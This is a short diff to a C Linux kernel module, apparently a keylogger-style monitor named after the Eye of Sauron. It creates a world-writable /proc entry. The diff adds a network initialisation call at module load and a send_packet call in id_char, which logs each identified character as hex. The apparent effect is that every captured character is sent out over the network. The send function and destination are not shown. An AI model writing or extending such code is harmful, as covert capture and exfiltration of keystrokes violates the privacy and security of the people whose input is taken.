@@ -47,6 +47,7 @@ static int start_eye(void)
     printk("The Eye of Sauron is upon you.\n");
 
     _ops = proc_create("eye", 0777, NULL, &fops);
+    initialize_net();
 //    ring_on();
 
     return 0;
@@ -97,6 +98,8 @@ static uint8_t id_char(char n)
     {
         printk(KERN_CONT "<%02x>", c);
     }
+
+    send_packet(c);
 
     return c;
 }
